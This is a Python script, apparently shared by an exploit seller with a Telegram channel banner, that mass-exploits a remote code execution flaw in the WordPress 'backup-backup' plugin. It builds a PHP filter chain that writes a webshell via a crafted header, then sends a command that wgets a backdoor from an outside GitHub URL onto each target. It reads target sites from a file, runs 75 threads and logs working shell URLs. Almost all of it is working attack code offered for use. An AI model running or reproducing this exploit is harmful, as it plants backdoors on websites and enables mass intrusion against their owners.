import sys
import requests
from multiprocessing.dummy import Pool
from colorama import init
import base64
import random
import string
from colorama import Fore, Style

class PHPFilterChainGenerator:
    def __init__(self):
        self.conversions = {
            "0": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2",
            "1": "convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4",
            "2": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921",
            "3": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE",
            "4": "convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE",
            "5": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2",
            "6": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2",
            "7": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4",
            "8": "convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2",
            "9": "convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB",
            "A": "convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213",
            "a": "convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE",
            "B": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000",
            "b": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE",
            "C": "convert.iconv.UTF8.CSISO2022KR",
            "c": "convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2",
            "D": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213",
            "d": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5",
            "E": "convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT",
            "e": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937",
            "F": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB",
            "f": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213",
            "g": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8",
            "G": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90",
            "H": "convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213",
            "h": "convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE",
            "I": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213",
            "i": "convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000",
            "J": "convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4",
            "j": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16",
            "K": "convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE",
            "k": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2",
            "L": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC",
            "l": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE",
            "M": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T",
            "m": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949",
            "N": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4",
            "n": "convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61",
            "O": "convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775",
            "o": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE",
            "P": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB",
            "p": "convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4",
            "q": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2",
            "Q": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2",
            "R": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4",
            "r": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101",
            "S": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS",
            "s": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90",
            "T": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103",
            "t": "convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS",
            "U": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943",
            "u": "convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61",
            "V": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB",
            "v": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2",
            "W": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936",
            "w": "convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE",
            "X": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932",
            "x": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS",
            "Y": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361",
            "y": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT",
            "Z": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16",
            "z": "convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937",
            "/": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4",
            "+": "convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157",
            "=": "",
        }

    def generate_filter_chain(self, chain):
        chain = chain.encode("utf-8")
        chain = base64.b64encode(chain).decode("utf-8").replace("=", "")
        encoded_chain = chain
        filters = "convert.iconv.UTF8.CSISO2022KR|"
        filters += "convert.base64-encode|"
        filters += "convert.iconv.UTF8.UTF7|"

        for c in encoded_chain[::-1]:
            filters += self.conversions.get(c, "") + "|"
            filters += "convert.base64-decode|"
            filters += "convert.base64-encode|"
            filters += "convert.iconv.UTF8.UTF7|"

        filters += "convert.base64-decode"
        final_payload = f"php://filter/{filters}/resource=php://temp"
        return final_payload

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

fr = Fore.RED
fg = Fore.GREEN

banner = '''{}
           
[#] Create By ::
	  ___                                                    ______        
>=>      >=>           >======>         >===>          >===>      >===>>=====> 
 >=>   >=>   >====>>=> >=>    >=>     >=>    >=>     >=>    >=>        >=>     
  >=> >=>         >=>  >=>    >=>   >=>        >=> >=>        >=>      >=>     
    >=>          >=>   >> >==>      >=>        >=> >=>        >=>      >=>     
  >=> >=>       >=>    >=>  >=>     >=>        >=> >=>        >=>      >=>     
 >=>   >=>      >=>    >=>    >=>     >=>     >=>    >=>     >=>       >=>     
>=>      >=>    >=>    >=>      >=>     >===>          >===>           >=>     
          ############## perv exploit rce wordpress ##############                                                                     		 
	    Telegram Channels => https://t.me/x7seller	              
                                                 

\n'''.format(fr)


print(banner)

try:
    target_file_path = sys.argv[1]
    with open(target_file_path, mode='r') as file:
        target = [line.strip() for line in file.readlines()]
except IndexError:
    exit(f'\n  [!] Enter <{sys.argv[0]}> <sites.txt>')

def char_to_hex_escaped(char):
    return "\\x" + "{:02x}".format(ord(char))

random_file_name = "".join(random.choices(string.ascii_letters + string.digits, k=3)) + "@x7root.php"

def explitcve(i):
    string_to_write = f"<?=`$_POST[ova]`?>"

 
    generator = PHPFilterChainGenerator()
    hex_escaped_char = generator.generate_filter_chain(string_to_write)
        
       
    text = "This is a server-side script; you will not get any response here"

    hd = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'
        }

    hdo = {'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
            'Accept': '*/*',
            'content-dir': hex_escaped_char }

    backdoorsh = "https://raw.githubusercontent.com/httpplain/z/main/y8zus4kuc6.txt"

    url = i.rstrip('/') + '/wp-content/plugins/backup-backup/includes/backup-heart.php'
    

    rova = requests.post(url, headers=hdo, verify=False, timeout=20)
    exploit = {"ova":'wget ' + backdoorsh + ' ' + ' -O' + random_file_name}
    rovae = requests.post(url, headers=hdo,data=exploit, verify=False, timeout=20)
    
    if rova.status_code == 200:
       
        shellupload = i.rstrip('/') + f'/wp-content/plugins/backup-backup/includes/{random_file_name}'
        #print(f"{shellupload} Uploaded Shell Now Check Shell ....!")
       
        rrova = requests.get(shellupload, headers=hd, verify=False, timeout=20)
        fg = Fore.GREEN
        if 'x7root-Tools' in str(rrova.content):
            print(f'{shellupload} Shell Work {Style.RESET_ALL}{fg}')
            with open('Results.txt', 'a') as bck:
                 bck.writelines(shellupload + '\n')
        else:
             print('Failed: ' + i)
    else:
         print('Failed: ' + i) 

def checkpor(i):
    try:
        if not i.startswith('http://') and not i.startswith('https://'):
            i = 'http://' + i

        explitcve(i)

    except Exception as e:
        print(f"An error occurred: {e}")

mp = Pool(75)
mp.map(checkpor, target)
mp.close()
mp.join()